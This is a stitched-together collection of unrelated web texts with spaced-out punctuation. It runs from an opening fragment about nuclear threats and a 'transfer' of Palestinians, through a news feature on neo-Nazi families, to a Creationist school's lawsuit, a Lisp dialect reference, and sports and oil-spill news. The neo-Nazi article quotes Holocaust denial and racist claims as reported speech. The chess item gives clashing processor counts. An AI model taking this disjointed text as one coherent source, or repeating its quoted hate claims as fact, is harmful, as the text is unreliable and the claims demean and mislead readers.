The author of The Transformation of War forcefully stated that , as of now , there are already nuclear warheads aimed against Rome and other European capitals that render the threat credible and the " transfer " of the Palestinians possible .
Nazi nightmare : The U.S. parents who teach their children to idolise Hitler
Smiling proudly as she wraps her arms around her two children , Cynthia Keene 's family paint a happy picture .
But as they roll up their sleeves to reveal dozens of swastika tattoos it 's clear there is nothing average about their lifestyle .
Because the Keenes are just one of a growing number of Nazi families who have joined the racist group , the NSM ( National Socialist Movement ) .
Cynthia Keene and her children Brad and Ariana are members of the National Socialist Movement - a racist group with idolises Hitler and denies that the Holocaust ever happened
They idolise Hitler , believe the Holocaust never happened and want all non-white people deported from America .
Black people are banned from entering their family home and the younger siblings are already learning if they do n't follow in their white supremacist footsteps they will likely be outcast .
' All - non white people in America should be sent back to where they came from , and me and my kids will fight to make that happen , ' said Cynthia speaking from a motel room in Los Angeles where she and two of her children , Brad , 23 and Ariana , 17 were preparing to attend a Nazi rally .
' I'm proud of my children and what they believe in . '
Cynthia 's five children are being raised to share her radical racist beliefs
The unemployed activist has five children by three different men , and she hopes all of them will share her radical racist beliefs .
' I know my other children will become members of the NSM one day , and I will teach them what they need to know , ' revealed Cynthia , who is also mother to Chelsea , 18 , Raven , 14 , and Arien 12 .
And Cynthia is not the only Nazi parent encouraging her children to follow in her racist footsteps .
Scott Clarke , 37 , who lives in Northern California , said : ' I 've been part of the movement for 22 years , since I was 15 - years - old .
' I became a skinhead first which I think is a very good way to start .
I believe the races need to be separated and that we need to stop this ' mongrelisation ' of our nation .
' I was n't brought up this way .
But I now raise my children to be racially conscious .
' I have three children , a 20 - year - old , a 15 - year - old and an eight - year - old .
They all support the NSM .
' My daughter in particular is extremely racially conscious .
Heavily - tattooed Scott Clarke has been a member of the NSM for 22 years and greets fellow group members with a ' heil Hitler ' salute
' I 'm very proud of her .
Where we live there are a lot of Hispanics and blacks and she has nothing to do with any of them . '
Nearly every inch of Clarke 's body is covered in tattoos and he is proud to show them off .
A self - confessed football hooligan , he makes no attempt to hide his distain for non-white races .
He greets his fellow NSM members with a ' heil Hitler ' salute .
Despite the fact that mum of five Cynthia has never been in the forces she is referred to as Sgt. Cynthia Keene with others earning ranks such as commander and chief .
' It 's to give us a feeling of community and something to work towards , ' she said .
' That is also why we wear uniforms . '
Rallies are attended by thousands of people waving swastika flags , giving the Hitler salute and preaching racist , anti-Semitic and homophobic propaganda .
And youngsters are welcomed to the events .
The Keene 's drove non-stop for 26 hours from their home in Springfield , Missouri , to attend the rally in Los Angeles .
Sporting a partial skinhead and swastika symbol on her t- shirt , Cynthia talked about banning non-whites from her home and the disgust she has for mixed race people , as both Brad and Ariana nodded in approval .
' In the very unlikely situation that my kids were pro-mixed culture , I would deal with it if they kept it at school , ' she said .
' But if they tried to bring a black , Mexican or Chinese friend home , I would n't have that . '
Her eldest son refuses to even comprehend the idea .
' I do n't think we really have to think about what would happen if my other sisters or brother decided to accept non-whites , ' said Brad , who has been a member of the NSM for nearly four years .
' If it did , that would be their choice .
But I would have no part of it .
I would disassociate myself with them .
But I know it would n't happen . '
The NSM claim they are a non-violent group but Cynthia admits she does worry about the safety of her children .
' I have had people giving me the finger and spit while I am clearing litter off the streets , ' said Cynthia who works at weekends clearing her local highway of rubbish .
' I do have concerns for my daughter 's safety especially at some of the rallies , like this one in LA .
But I worry about the safety of everyone in the group . '
However Clarke added : ' All my children can handle themselves .
I 've taught my children how to use firearms .
' I take a lot of pride in my daughter because she has taken to this lifestyle so well .
' I'm proud to have her by my side when we are at rallies .
' And if she did n't have school she would be out there waving the flags right now like everyone else . '
Very young children are not allowed to be members of the NSM but that does n't blinker them from their parent 's racist attitudes .
High School student Ariana has only been with the NSM for two years but is already the director of the NSM's , Viking Youth Corp , for 14 - 18 - year - olds .
' I would honestly be very hurt if my siblings did n't share my views , ' she said .
' For them to go out and takes sides with someone else would be awful .
I do n't think I would be able to accept them and that part of the family .
' If they had a mixed race child I could n't look at that child and say , ' what a beautiful baby ' .
Knowing that was my niece or nephew , I just could n't do it .
' I could n't look at them the same way . '
Cynthia and extremists like her shockingly believe they have to protect the USA from becoming a completely black nation and say whites are in danger of being wiped - out .
She has taught her children to hate Jews and they see nothing wrong with saluting Hitler .
They now even talk of the swastika as an ' ancient symbol of love . '
' I have read a little bit about their religion and a lot of it is very damaging to people , ' she said .
' The Jews are definitely the worst race in America . '
Ariana has clearly picked up on her mum 's beliefs often using the exact same terms and phrases .
They even laughed together when asked if they believe in the Holocaust .
' It 's a myth , ' they both said .
' There is no evidence . '
The Institute for Creation Research suffered a significant legal defeat in its lawsuit over the Texas Higher Education Coordination Board 's 2008 decision to deny the ICR 's request for a state certificate of authority to offer a master 's degree in science education from its graduate school .
A June 18 , 2010 , ruling in the United States District Court for the Western District of Texas found ( PDF , p. 38 ) that " ICRGS [ the Institute for Creation Research Graduate School ] has not put forth evidence sufficient to raise a genuine issue of material fact with respect to any claim it brings .
Thus , Defendants are entitled to summary judgment on the totality of ICRGS 's claims against them in this lawsuit . "
As NCSE 's Glenn Branch explained in Reports of the NCSE , " When the Institute for Creation Research moved its headquarters from Santee , California , to Dallas , Texas , in June 2007 , it expected to be able to continue offering a master 's degree in science education from its graduate school .
...
But the state 's scientific and educational leaders voiced their opposition , and at its April 24 , 2008 , meeting , the Texas Higher Education Coordination Board unanimously voted to deny the ICR 's request for a state certificate of authority to offer the degree . "
Subsequently , the ICR appealed the decision , while also taking its case to the court of public opinion with a series of press releases and advertisements in Texas newspapers .
The issue was not , strictly speaking , about accreditation , but about temporary state certification , which would have enabled the ICR graduate school to operate while it sought accreditation .
When in California , the ICR graduate school was accredited by the Transnational Association of Christian Colleges and Schools , which requires candidate institutions to affirm a list of Biblical Foundations , including " the divine work of non-evolutionary creation including persons in God 's image . "
TRACS is not recognized by the state of Texas , however , and after the ICR moved from Santee , California , to Dallas , Texas , the ICR expressed its intention to seek accreditation from the Southern Association of Colleges and Schools .
Finally , the ICR filed suit against THECB in 2009 , accusing it and its members of imposing " an unconstitutional and prejudicial burden against ICRGS 's academic freedom and religious liberties . "
The prolix style of the ICR 's initial complaint — which the Dallas Observer ( April 20 , 2009 ) quipped " reads kind of like stereo instructions " — was apparently continued in its subsequent documents ; the court complained , " It appears that although the Court has twice required Plaintiff to re-plead and set forth a short and plain statement of the relief requested , Plaintiff is entirely unable to file a complaint which is not overly verbose , disjointed , incoherent , maundering , and full of irrelevant information " ( p. 12 ) .
In summary , the ICR claimed that THECB 's actions violated its rights to free exercise , free speech , and equal protection , its rights to procedural and substantive due process , and its rights under the Texas Religious Freedom Restoration Act , as well as that " Standard 12 " — the civil regulation on which THECB 's decision was based ( 19 Texas Administrative Code sec. 7.4 ( 14 ) ) — was vague .
The court found merit in none of these claims .
With respect to the free exercise claim , for example , the court found that " the Board ’s decision was rationally related to a legitimate governmental interest , and there is no evidence the decision was motivated by animus toward any religious viewpoint " ( p. 24 ) .
There are plenty of super yacht concepts that I 'll never touch , much less own — such as ones with three level designs or impossible masts — but I 'm still happy that a design finally includes a built - in garage .
And a super car .

Compiling a.ss creates the byte - code compiled file a_ss.zo , which will be used by mzscheme in preference to the source code if it encounters

racket
In order for code to be compiled as a standalone executable , it must be packaged as a module .
This can be accomplished by putting the #lang scheme shorthand the top of the file .
All functions that are defined in the module will be executed in order .
Here is a simple example :
#lang scheme ( define hello ( printf " Hello world ! ~n " ) )

To run some lisp code from within emacs , use M-x load or M-x load - file .
The first command will use the list of strings in load - path to search for the file .
It is not necessary to specify the .el or .elc suffix if the file has one .

In lisps other than clojure , any character can be used in a symbol .
Some characters are special to the reader and must be escaped to include them in a symbol .
The reader will interpret a sequence of characters starting with a digit as a number instead of a symbol , so escaping must be used to create such a symbol .
common lisp :
Common Lisp is case insensitive , and the reader converts all letters to upper case .
A symbol consisting of just periods " . " must be escaped .
Symbols that start and end with an asterisk " * " may conflict with system defined special variables .
racket :
# is only disallowed by the reader at the beginning of symbols .
A symbol consisting of a single period must be escaped .
#| |# delimited comments in Common Lisp and Scheme can span multiple lines , and thus can be used to comment out code .
clojure :
Code with balanced parens can be commented out in the following manner :
( comment (+ 1 1 ) )

nil and the empty list '( ) are identical .
How to test whether a value is null .
How to get the value of an identifier .
In Lisp , identifiers are first class values and can be stored in variables .
When used as an argument , the Lisp interpreter will treat an identifier as the value of the variable associated with the identifier unless special syntax is used .
How to test whether a value is an identifier .
A non-referential identifier is an identifier whose value is itself .
Non-referential identifiers are called keywords in Lisp .
They also appear in Prolog , where they are called atoms , and Ruby , where they are called symbols .
A non-referential identifier can be convenient to use as a key in a dictionary , since it does n't have to single quote escaped .
Strings are an alternative to non-referential identifiers ; some languages have string interning which makes the use of strings just as efficient as non-referential identifiers .
In Common Lisp , there is a dictionary of attributes associated with each identifier called a property list .
Clojure metadata is stored with a value which is an instance of clojure .
lang .
IObj .
Many types are subclasses of clojure .
lang .
IObj , but integers , floats , and strings are not .
Clojure metadata is immutable : all keys must be set at once and there is no way to remove keys .
cell types
The different cell types .
A lisp - 1 only stores a single entity under a symbol in a given environment .
A lisp - 2 stores multiple entities , and which entity a symbol will resolve to depends on how the symbol is used .
In particular , a value and a function can be stored under the same symbol without collision .
nil , is ( ) null ? , is ( ) symbol ?
( eq nil ( ) )
is true in common lisp and emacs lisp .
( eq ? ( ) null )
is true in Scheme .
keyword
Keywords are pre-defined symbols that evaluate to their printed representation .
The reader recognizes them by the initial colon , or in the case of Scheme , by the initial " # : " .
In Scheme it is an error to use a keyword as an expression .
atom
atom is is a predicate which returns false for cons cells , and true for anything else .
All lists except for the empty list are cons cells .
racket
Scheme lacks atom , but cons ? is its logical negation .
clojure
Clojure lacks cons cells .
Thus atom if implemented in the language would always return true .
However , ( not ( list ? x ) ) is closer to the spirit and certainly more useful .
Because nil is not the empty list in clojure there is also ambiguity about what the value of ( atom ( ) ) would be .
quote
All lisps have a single quote macro abbreviation for quote .
Here are identical ways to quote a symbol and a list :
( quote a ) ' a ( quote (+ 3 7 ) ) '(+ 3 7 )
eval is a one - sided inverse of quote .
If X is arbitrary lisp code , then the following are identical
X ( eval ( quote X ) )
eq , equal , =
In his 1960 paper , McCarthy described eq as undefined if either or both arguments are not atomic .
Common Lisp and Scheme ( eq ? ) return true if the arguments both evaluate to the same list in memory , otherwise false .
equal and equal ?
( Scheme ) return true if the arguments evaluate to lists with the same elements as determined by calling equal or equal ?
recursively .
In Common Lisp and Scheme , = can only be called on numeric arguments .
The predicates for whether a symbol is numeric are numberp and number ? , respectively .
Clojure dispenses with eq and equal and defines = to be equivalent to the Common Lisp equal .
car
Because car and cdr are abbreviations for parts of the word of the IBM 704 , there is a trend to replace them with first and rest .
However , car and cdr are short , and convenient notation exists for abbreviating nested calls to car and cdr .
In terms of car , cdr , and combinations thereof , here is what the dialects define :
common lisp r5rs racket clojure emacs lisp car , first car car , first first car , first cadr , second cadr cadr , second second , fnext cadr , second caddr , third caddr caddr , third caddr , third cadddr , fourth cadddr cadddr , fourth cadddr , fourth fifth fifth fifth sixth sixth sixth seventh seventh seventh eighth eighth eighth ninth ninth ninth tenth tenth tenth cdr , rest cdr cdr , rest rest , next cdr , rest cddr cddr cddr cddr cdddr cdddr cdddr cdddr cddddr cddddr cddddr cddddr caar caar caar ffirst caar cdar cdar cdar nfirst cdar
cdr
common lisp
cdr and rest return nil when called on an empty list .
racket
cdr and rest raise an error when called on an empty list .
clojure
rest returns an empty set ( ) when called on an empty or singleton list , whereas next returns nil .
In clojure , the empty set evaluates as true in a boolean context and nil evaluates as false .
cons
clojure
Clojure does not implement a list as a linked list of cons cells .
The second argument to cons must be a list .
cond
lambda
clojure :
(#(+ %1 %2 ) 1 2 )
label
apply
integers
Common Lisp and Racket have arbitrary - precision integers and use them by default .
Racket provides the fixnum library for access to hardware integers :
( require racket / fixnum ) ( fx+ 3 7 )
Operations on Racket fixnums cause an error when they overflow .
rationals and floats
Common Lisp and Racket have arbitrary - precision rationals .
Racket uses them in a number of cases when Common Lisp uses hardware floats :
3.14 3e10 ( exp 1 )
Racket provides the flonum library for access to hardware floats :
( require racket / flonum ) ( fl* 3.1 - 7.2 )
complex numbers
Both the real and imaginary part of a Common Lisp complex number will have the same type , but the type can be integer , rational , or float .
Literals for true and false .

racket :
The following all evaluate as #t :

closure of integers under division
The number system that containing the potential results of integer division .
In mathematics , the closure of integers under division is the rationals , and this is true for common lisp , scheme , and clojure as well .
Emacs lisp performs integer division ( i.e. computes the quotient ) , so the closure of the integers under division is the integers .
In Lisp , + and * take zero or more arguments and - and / take one or more arguments .
With zero arguments + and * return the additive and multiplicative identities 0 and 1 .
With one argument + and * return the argument and - and / return the additive and multiplicative inverses : i.e. the negation and the reciprocal .
When evaluating 3 or more arguments - and / are computed from left to right : i.e. (- 3 4 5 ) is computed as ( - (- 3 4 ) 5 ) .
clojure :
Math.pow returns a double .
emacs :
Unary division ( i.e. computing the reciprocal ) generates a wrong number of arguments error .
For rounding , floor , and ceiling , the return value is integer if the argument is rational and floating point if the argument is floating point , unless otherwise noted .
racket :
inexact -> exact can be used to convert a float returned by round , ceiling , or floor to an integer .
clojure :
Math / round always returns an integer and throws and error if called on a rational .
Math / floor and Math / ceil can be called on a rational , but always return a float .
emacs :
round , ceiling , and floor return integers .
fround , fceiling , and ffloor return floats .
quotient and remainder
( sqrt - 2 )

character literals
The syntax for character literals .
The first literal uses the letter " a " as an example of how to write a literal for all ASCII printing characters .
common lisp :
Characters are of type standard - char .
The predicate is characterp .
racket :
The predicate is char ?.
clojure :
Characters are of type java.lang .
Character .
emacs :
Characters are of type integer and can be manipulated by arithmetic operators .
characterp and integerp are synonyms .
string literal
The syntax for a string literal .
string escapes
A list of escape sequences that can be used in string literals .
emacs lisp :
The \x escape sequence is followed by one to six hex digits .
Because a variable number of hex digits can be used , it may be necessary to indicate the end of the sequence with a backslash and a space , e.g. the following string literal is " λ123 " :
" \x3 bb \ 123 "

comparison
common lisp :
Here is the complete list of string comparison functions :
string= string < string > string <= string >= string /=
There are also case insensitive versions of the above functions :
string - equal string - lessp string - greaterp string - not - greaterp string - not - lessp string - not - equal
racket :
Case sensitive string comparison :
string <=? string <? string= ?
string >=? string >?
Case insensitive string comparison :
string - ci<=? string - ci<? string - ci= ? string - ci>=? string - ci >?
emacs lisp :
Emacs has only these string comparison functions , all of which are case sensitive :
string= string - equal string < string - lessp
string= and string - equal are synonyms , as are string < and string - lessp .

convert from string , to string
How to convert strings to numbers , and numbers to strings .
common lisp :
read - from - string invokes the reader , so the return value is not guaranteed to be a floating point number .
Here is a parse - float function which will convert all real numeric types to floats and raise a simple error if another condition is encountered .
( defun parse - float ( s ) ( let ( ( readval ( handler - case ( read - from - string s ) ( sb- int : simple - reader - error nil ) ( end - of - file nil ) ) ) ) ( cond ( ( realp readval ) (+ readval 0.0 ) ) ( t ( error ( concatenate ' string " not a float : " s ) ) ) ) ) )

( car ' ( ) )
( cdr ' ( ) )
( eval ' ( ) )
A practical advantage of having ( eval '( ) ) be equal to '( ) is that the empty list does n't have to be quoted .
list functions
nth
nth and list - ref count from zero .
nth returns nil if the index is too large .
list - ref throws an error .
index of list element
How to get the index of a list element .
The first element of a list has an index of zero .
last butlast
In clojure , last and butlast are analogs of first and rest which operate at the end of a list .
If X is a list , then the following code pairs are identities :
( last X ) ( first ( reverse X ) ) ( butlast X ) ( reverse ( rest ( reverse X ) ) )
The analogy breaks down in Common Lisp because last returns a list with a single element .
set - car set-cdr
common lisp :
The following code pairs perform the same operation on the list :
( setf ( car l ) 3 ) ( rplaca l 3 ) ( setf ( cdr l ) ' ( 4 5 6 ) ) ( rplacd l ' ( 4 5 6 ) )
However , they are not identical because rplaca and rplacd return the modified list instead of their 2nd argument .
racket :
Racket provides a separate interpreter plt - r5rs for an R5RS compliant version of Scheme .
Also , the language can be set to R5RS within DrRacket .
emacs lisp :

( define ( push x a - list ) ( set - box ! a - list ( cons x ( unbox a - list ) ) ) ) ( define ( pop a - list ) ( let ( ( result ( first ( unbox a - list ) ) ) ) ( set - box ! a - list ( rest ( unbox a - list ) ) ) result ) )
clojure :
Note the in clojure , pop only returns the first element ; the original list is left unmodified .
vector literal
racket
# ( 1 2 3 ) creates an immutable vect .
( vector 1 2 3 ) creates a mutable vector .
vector access
set vector element
racket
vector - set !
throws an error if called on an immutable vector .
vector to list
list to vector
abstract sequence
Lists and vectors support the same operations ; the only difference is the speed at which the operations can be performed .
It is a convenience for the developer if functions that perform the operations have the same name ; i.e. if lists and vectors are members of an abstract sequence type .
Clojure has gone furthest in this direction , making all the customary list functions work on vectors as well .
In common lisp and emacs lisp , some of the list functions also work on vectors , and some do n't .
In Scheme none of the list functions work on vectors .
sequence data types
The containers that respond to sequence functions .
sequence predicate
list functions usable on sequences
make - array
In Lisp terminology , both arrays and vectors refer to collections which are of fixed size ; vectors are arrays with rank 1 .
Only common lisp supports arrays with rank greater than 1 .
array access
set array element
array dimensions
array - rank returns the number of indices required to specify an element in the array .
array - dimensions returns the size of the array ; the number of cells is the product of the elements of the list .
range
list comprehension
Lisp has a tradition of using lists of pairs for dictionaries .
The data structures in this section are implemented using hash tables .
racket :
In addition to hash tables there are a set of functions which work with any dictionary type , which in Racket include hash tables , lists of cons cell pairs , and vectors .
When a vector is treated as a dictionary , the value is an element and the key is the integer index of the element .
clojure :
There are three dictionary types which can be used with the functions described in this section :
constructor type ( hash - map " t " 1 " f " 0 ) clojure.lang.PersistentHashMap ( array - map " t " 1 " f " 0 ) clojure.lang.PersistentArrayMap ( zipmap ' ( " t " " f " ) ' ( 1 0 ) ) clojure.lang.PersistentArrayMap ( sorted - map " t " 1 " f " 0 ) clojure.lang.PersistentTreeMap ( sorted - map - by #(< %1 %2 ) " t " 1 " f " 0 ) clojure.lang.PersistentTreeMap
The syntax for a dictionary literal .
The constructor for a dictionary .
racket :
The constructors use equal ?
to test for equality of the two keys .
There are also constructors which use eq ? or eqv? to test keys : hasheq , hasheqv , make - immutable - hasheq , make - immutable - hasheqv .

How to check whether a key exists in a dictionary .
How to remove a key and its associated value from a dictionary .
How to merge two dictionaries .
How to turn a dictionary into its inverse .
If a key ' foo ' is mapped to value ' bar ' by a dictionary , then its inverse will map the key ' bar ' to the value ' foo ' .
If multiple keys are mapped to the same value in the original dictionary , some of the keys will be discarded in the inverse .
How to iterate over the key - value pairs in a dictionary .

let , let *
Traditionally let performs its assignments in parallel and let* serially .
clojure
In Clojure , let and let* are synonyms and both perform serial assignment .
emacs
Note that let uses dynamic scope .
Use lexical - let for lexical scope :
ELISP > ( let ( (x 3 ) ) ( defun get -x ( ) x ) ) get-x ELISP > ( get -x ) *** Eval error *** Symbol 's value as variable is void : x ELISP > ( let ( (x 4 ) ) ( get -x ) ) 4 ELISP > ( lexical - let ( ( x 3 ) ) ( defun get - x - 2 ( ) x ) ) get -x - 2 ELISP > ( get - x - 2 ) 3 ELISP > ( lexical - let ( ( x 4 ) ) ( get - x - 2 ) ) 3
define function
optional argument
variable number of arguments
default value
named parameter
common lisp :
In common lisp , named parameters are optional .
Named values can be assigned default values :
( defun logarithm ( &key number ( base 10 ) ) ( / ( log number ) ( log base ) ) )
If a named parameter is not provided at invocation and has not been assigned a default value , then it is set to nil .
racket :
How to Implement Named Parameters in Scheme
emacs lisp :
In emacs lisp named parameters are mandatory .
A runtime error results in they are not provided when the function is invoked .
tail call optimization
common lisp :
The ANSI Common Lisp specification does not require an implementation to perform tail call optimization .
How to get the documentation string for a function .
common lisp :
describe returns the documentation string with additional information such as the function signature .
To get just the documentation string use this :
( documentation #'mapcar ' function )
How to define a function that has a documentation string .
How to search definitions and documentation .
Apropos takes a pattern and returns all defined symbol names which match the pattern .
clojure :
apropos returns matching symbol names as a list .
find - doc searches all documentation strings and writes any which match to standard out .
Both apropos and find - doc can take a string or a regular expression as an argument .
emacs lisp :
apropos displays the documentation for matching definitions in the * Apropos * buffer .
The argument is a string but will be treated as a regular expression .
progn
progn and its equivalents in other dialects returns the value of the last expression .
Common Lisp and Emacs Lisp also have prog1 and prog2 for returning the value of the 1st or 2nd expression .
loop
do
dotimes
if
when
error
handle error
racket :
Calling error raises an exception of type exn:fail
emacs :
In the example :
( condition - case nil ( error " failed " ) ( error ( message " caught error " ) nil ) )
the 2nd argument to condition - case is the code which might raise an error , and the 3rd argument is the error handler .
The error handler starts with condition to be caught .
The last nil is the return value of the entire condition - case expression .
An error can not be handled by catch .
An uncaught throw will generate an error , which can be handled by a condition - case error handler .
define exception
How to define a custom exception with a payload .
common lisp :
The : report clause is not necessary .
If defined it will be displayed if the exception is handled by the lisp debugger .
throw exception
emacs :
The 1st argument of an emacs throw expression identifies the type of exception , and the 2nd argument will be the return value of the catch expression that catches the exception .
catch exception
emacs
The following catch expression will return nil :
( catch ' failed ( throw ' failed nil ) t )

Quicklisp
For a package manager we use Quicklisp .
Here is how to install it and use it to load the cl- ppcre library :
$ curl - O http://beta.quicklisp.org/quicklisp.lisp $ sbcl * ( load " quicklisp.lisp " ) * ( quicklisp - quickstart : install ) * ( ql:quickload " cl- ppcre " ) * ( cl - ppcre : all - matches " foo " " foo bar " )
Quicklisp creates a quicklisp directory in the user 's home directory .
Once quicklisp is downloaded and installed , it can be used like this :
$ sbcl * ( load " ~/quicklisp/setup.lisp " ) * ( ql:quickload " cl- ppcre " ) * ( cl - ppcre : all - matches " foo " " foo bar " )
One can ensure that Quicklisp is automatically loaded at startup by putting the load command into the .sbclrc file :
$ cat ~/.sbclrc ( load " ~/quicklisp/setup.lisp " )

Clojure Cheat Sheet
Calling Java
Here are the basics of calling Java code :
( def rnd ( new java.util.Random ) ) ; create Java object (. rnd nextFloat ) ; invoke method on object (. rnd next Int 10 ) ; invoke method with argument (. Math PI ) ; static member ( import '( java.util Random ) ) ; import
Clojure automatically imports everything in java.lang .
There are shortcuts for the above syntax :
( Random . ) ( new Random ) Math / PI (. Math PI ) ( . next Int rnd ) (. rnd nextInt )
Because they are primitive types and not objects , Clojure provides functions specific to Java arrays :
( make - array CLASS LEN ) ( make - array CLASS DIM & DIMS ) ( aset ARY IDX VAL ) ( aset ARY IDX_DIM1 IDX_DIM2 ... VAL ) ( aget ARY IDX ) ( aget ARY IDX_DIM1 IDX_DIM2 ... ) ( alength JARY ) ( to - array SEQ ) ( into - array TYPE SEQ ) ( amap ARY I COPY EXPR ) ( areduce ARY IDX COPY INIT EXPR )
GNU Emacs Manual
GNU Emacs Lisp Reference Manual
To get an introduction to Emacs Lisp Programming from within Emacs use
C-h i m Emacs Lisp Intro
Run M-x lisp - interaction - mode to put Emacs in lisp interaction mode .
In lisp interaction mode the command C-x e will evaluate the s-expression on the current line .
M-x eval - buffer will evaluate the entire buffer .
Use lisp interaction mode to define functions which can be called from Emacs .
The following defines a function called dired - emacs - lisp for browsing the Emacs Lisp directory :
( defun dired - emacs- lisp () " Open the Emacs Lisp directory in dired . " ( interactive ) ( dired " / Applications /Emacs.app/Contents/Resources/lisp " ) )
The directory is hard - coded into the function and may be different on your system .
Once defined the function can be invoked with M-x dired - emacs - lisp .
Not all Lisp functions can be called in this manner .
Those that can are called commands .
The body of a command has an optional documentation string , followed by a call to interactive , followed by the code which executes when the command is invoked .
The documentation string can be accessed from Emacs by running M-x describe - function and entering the name of the function when prompted .
The call to interactive is what makes a Lisp function a command .
It can takes optional arguments .
Use M-x describe - function on interactive to see a description of these arguments .
To bind the command to the key C-c l run the following in Lisp interaction mode :
( global - set - key " \C-cl " ' dired-emacs-lisp )
​ Rolling Stones legend Mick Jagger has called for U.K. government officials to legalize marijuana and other drugs on a British island , to see if it prevents violence associated with the illegal drug trade .
The rock singer , who was convicted of marijuana possession in the 1960s , said that young people will always experiment with psychoactive substances , despite the risks , reports StarPulse .
He is urging the government to legalize drugs on the Isle of Man , a British Crown dependency in the Irish Sea , to test the consequences of an end to prohibition .
“ The whole question of legalizing drugs is fraught …
You usually try these things out in very small places , ” Jagger told interviewer Larry King .
“ You know , like you try a new product out in a small kind of society or an island somewhere , ” Jagger said .
“ And in England they always try out new mobile phones in Isle of Man , ” Jagger said .
“ They ’ve got a captive society .
So I said , you should try — you should try the legalization of all drugs on the Isle of Man and see what happens . ”
“ Human beings seem to have a propensity to want to take drugs in some form , ” Jagger said .
“ It seems to be the propensity of human beings to want to use them . ”
“ And then you also get a lot of violence at both ends of the scope , ” Jagger said .
“ So you get violence in some countries … which , like , we have in Mexico now , and you get violence at the other end of people trying to obtain drugs .
That ’s the part that speaks to some sort of legalization , Because that , you would hope , would help the violence from both ends of the supply line . ”
The Argentina coach Diego Maradona insulted an injured cameraman after accidentally running over his leg ahead of announcement of the albiceleste World Cup squad .
Driving to yesterday 's news conference in Buenos Aires , the 1986 World Cup winner was surrounded by journalists .
One was hit and he fell to the ground .
According to a witness , Maradona 's car rolled over the lower part of the cameraman 's leg .
" What an asshole you are , " Maradona shouted from the car .
" How can you put your leg there where it can get run over , man ? "
Paramedics attended to the cameraman , who was taken away for further treatment .
The 49 - year - old coach then delivered the names of the 23 - man squad for the World Cup to the media .
Maradona 's World Cup preparation was disrupted in March when he needed minor facial surgery after being bitten by his dog .
8192 processors helping Topalov attack the next world chess title
Veselin Topalov and Viswanathan Anand simultaneously revealed part of the preparation they were using for the World Chess Championship in Sofia .
For the Chessbase blog Anand commented that he relied on his team from Bonn – Ganguly , Nielsen , Kasimdzhanov , and Wojtaszek ( all photographed here in the press room ) , as well as help from Magnus Carlsen , Anish Giri , and Kasparov , as blitz and sparring partners .
A team of top seconds , and even so Anand was firm that the team was heavily computer dependant and that “ Nielsen ’s desktop looks like pilot ’s cockpit ” .
Veselin Topalov revealed long before the match his core team – Cheparinov , L’Ami , Smeets , and Dufek .
However , the bombastic news , which has only been rummored so far , came from an interview for Dnevnik.bg .
Topalov confirmed that he has been using the Blue Gene / P supercomputer , with 8792 processors and working on 1 PFLOPS ( petaFLOPS ) .
Read on for the details exclusively by Chessdom.com .
Blue Gene / P
Blue Gene is a computer architecture project designed to produce several supercomputers , designed to reach operating speeds in the PFLOPS ( petaFLOPS ) range , and currently reaching sustained speeds of nearly 500 TFLOPS ( teraFLOPS ) .
It is a cooperative project among IBM ( particularly IBM Rochester and the Thomas J. Watson Research Center ) , the Lawrence Livermore National Laboratory , the United States Department of Energy ( which is partially funding the project ) , and academia .
There are four Blue Gene projects in development : Blue Gene /L , Blue Gene / C , Blue Gene / P , and Blue Gene /Q .
On June 26 , 2007 , IBM unveiled Blue Gene / P , the second generation of the Blue Gene supercomputer .
Designed to run continuously at 1 PFLOPS ( petaFLOPS ) , it can be configured to reach speeds in excess of 3 PFLOPS .
Furthermore , it is at least seven times more energy efficient than any other supercomputer , accomplished by using many small , low - power chips connected through five specialized networks .
Four 850 MHz PowerPC 450 processors are integrated on each Blue Gene / P chip .
The 1 - PFLOPS Blue Gene / P configuration is a 294,912 - processor , 72 - rack system harnessed to a high - speed , optical network .
Blue Gene / P can be scaled to an 884,736 - processor , 216 - rack cluster to achieve 3 - PFLOPS performance .
A standard Blue Gene / P configuration will house 4,096 processors per rack .
Blue Gene / P has been installed on September 9 , 2008 in Sofia , the capital of Bulgaria , and is operated by the Bulgarian Academy of Sciences and the Sofia University .
Topalov has used exactly this modification of Blue Gene / P during his match with Viswanathan Anand for the World Chess Championship .
For local media Topalov comments , “ During my preparation for the match , with Silvio Danailov we have decided to look for additional resources for my preparation against Anand .
We decided to use the processing power of Blue Gene / P with 8192 processors . ”
The only problem for Topalov was that there is no software that runs on such hardware .
For Dnevnik Topalov revealed that he has collected a team of computer professionals to modify a program to work on the Blue Gene .
Topalov will use the computer for his future preparation for the Candidate matches 2010 / 2011 .
Until then it will help young local chess players , who will be playing games and analysing with the supercomputer .
On June 10th Topalov will join them to help in a series of 10 blitz games against the machine .

Topalov confirms participation in the Chess Olympiad
In a series of interviews after the World Chess Championship , Veselin Topalov revealed step by step the competitions he will take part in during this year .
Immediatelly after the match he confirmed he will attack the title again in 2010 / 2011 through the Candidate matches in Baku or Khanty Mansiysk ( a division of the event is necessary by request of Aronian , more info later on Chessdom.com ) .
He will leading negotiations with the Bilbao Final Masters 2010 and its second part in Shanghai , China ( 10 - 16 October 2010 ) , as well as the 3rd Nanjing Super Chess Tournament in 18 - 28 October 2010 .
Another sure event for Topalov is the World Chess Olympiad 2010 , where he will lead the Bulgarian team .
The future of the supercomputer , Blue Gene / Q
The last known supercomputer design in the Blue Gene series , Blue Gene / Q is aimed to reach 20 Petaflops in the 2011 time frame .
It will continue to expand and enhance the Blue Gene / L and / P architectures with higher frequency at much improved performance per watt .
Blue Gene / Q will have a similar number of nodes but many more cores per node .
Exactly how many cores per chip the BG / Q will have is currently somewhat unclear , but 8 or even 16 is possible , with 1 GB of memory per core .
The archetypal Blue Gene / Q system called Sequoia will be installed at Lawrence Livermore National Laboratory in 2011 as a part of the Advanced Simulation and Computing Program running nuclear simulations and advanced scientific research .
It will consist of 98,304 compute nodes comprising 1.6 million processor cores and 1.6 PB memory in 96 racks covering an area of about 3000 square feet , drawing 6 megawatts of power .
A Blue Gene / Q system called Mira will be installed at Argonne National Laboratory early in 2012 .
It will consist of approximately 50,000 compute nodes ( 16 cores per node ) , 70 PB of disk ( 470 GB/s I /O bandwidth ) and will be water - cooled .
The Blue Gene /Q will be ready before the World ChessChampionship 2012 and the Chess Olympiad 2012 .
The question now is , who will be the first chess players to get access to using the full power of the machine ?

So this is the " small " leak , as recorded by BP on May 15 and May 16 :
Last week , BP released video of the " main " leak which scientists estimated could have been gushing between 25,000 and 80,000 barrels per day .
Having this video helps gives us a better idea of what is gushing into the ocean and should server as a reminder that the official estimate of 5,000 barrels per day is a massive underestimate .
To the extent that this represents increased transparency on the part of BP , it 's a very small step .
